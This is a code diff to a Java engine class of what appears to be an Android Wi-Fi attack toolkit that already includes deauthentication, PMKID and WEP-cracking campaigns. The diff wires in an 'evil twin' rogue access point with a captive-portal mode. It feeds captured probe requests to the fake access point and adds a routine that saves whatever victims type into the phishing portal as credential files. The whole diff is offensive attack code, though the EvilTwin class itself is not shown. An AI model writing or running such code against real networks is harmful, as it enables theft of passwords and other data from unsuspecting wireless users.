@@ -12,6 +12,7 @@ import com.opx.oss.engine.chips.ChipCatalog;
 import com.opx.oss.engine.attacks.Campaign;
 import com.opx.oss.engine.attacks.DeauthCampaign;
 import com.opx.oss.engine.attacks.DecloakCampaign;
+import com.opx.oss.engine.attacks.EvilTwin;
 import com.opx.oss.engine.attacks.PmkidCampaign;
 import com.opx.oss.engine.attacks.WepCampaign;
 import com.opx.oss.engine.capture.Handshake;
@@ -72,6 +73,7 @@ public final class NativeEngine {
     private volatile Campaign campaign;
     private volatile String campaignKind;
     private volatile String campaignBssid;
+    private volatile EvilTwin twin;
     private final ExecutorService worker = Executors.newSingleThreadExecutor(runnable -> {
         Thread thread = new Thread(runnable, "opx-native-engine");
         thread.setDaemon(true);
@@ -313,7 +315,10 @@ public final class NativeEngine {
         if (type == 2 && (mpdu[1] & 0x40) != 0) wep.feed(mpdu);
         if (type == 0 && Frame.subtype(fc0) == Frame.SUBTYPE_PROBE_REQ) {
             String ssid = Parser.probeRequestSsid(mpdu);
-            if (ssid != null) probes.record(Mac.text(Parser.slice(mpdu, 10, 6)), ssid);
+            byte[] requester = Parser.slice(mpdu, 10, 6);
+            if (ssid != null) probes.record(Mac.text(requester), ssid);
+            EvilTwin running = twin;
+            if (running != null && ssid != null) running.offerProbe(requester);
             return;
         }
         if (type != 2) return;
@@ -426,6 +431,23 @@ public final class NativeEngine {
                 cracking = false;
             }
         });
+    }
+
+    /** Keep what a client typed into the portal, next to the other captures. */
+    private void savePortal(String bssid, JSONObject fields) {
+        if (fields == null) return;
+        StringBuilder text = new StringBuilder();
+        for (java.util.Iterator<String> it = fields.keys(); it.hasNext(); ) {
+            String key = it.next();
+            text.append(key).append('=').append(fields.optString(key)).append('\n');
+        }
+        if (text.length() == 0) return;
+        try {
+            Vault.save(context, "portal_" + (bssid == null ? "unknown" : bssid.replace(':', '-')) + ".txt",
+                    text.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
+        } catch (Exception e) {
+            error("cannot save the portal capture: " + e.getMessage());
+        }
     }
 
     /** Keep a recovered WEP key next to the other captures. */
@@ -556,6 +578,12 @@ public final class NativeEngine {
             case "wep":
                 starting = new WepCampaign(adapter, bssid, options, wep);
                 break;
+            case "eviltwin":
+                starting = new EvilTwin(adapter, bssid, options, scan, false);
+                break;
+            case "captive":
+                starting = new EvilTwin(adapter, bssid, options, scan, true);
+                break;
             default:
                 error(kind + " is not available yet");
                 return;
@@ -564,6 +592,7 @@ public final class NativeEngine {
         campaign = starting;
         campaignKind = kind;
         campaignBssid = bssid;
+        if (starting instanceof EvilTwin) twin = (EvilTwin) starting;
         emit(event("attack_started").put("kind", kind).put("bssid", bssid));
         Campaign running = starting;
         worker.execute(() -> {
@@ -579,6 +608,9 @@ public final class NativeEngine {
                     if ("wep_key".equals(name)) {
                         saveWepKey(entry.optString("bssid"), entry.optString("key"));
                     }
+                    if ("portal_credentials".equals(name)) {
+                        savePortal(entry.optString("bssid"), entry.optJSONObject("fields"));
+                    }
                     emitQuietly(entry);
                 });
                 summary = kind + " finished";
@@ -587,6 +619,7 @@ public final class NativeEngine {
                 summary = e.getMessage();
             } finally {
                 campaign = null;
+                twin = null;
                 JSONObject done = event("attack_done");
                 try {
                     done.put("ok", ok).put("kind", kind).put("summary", summary);
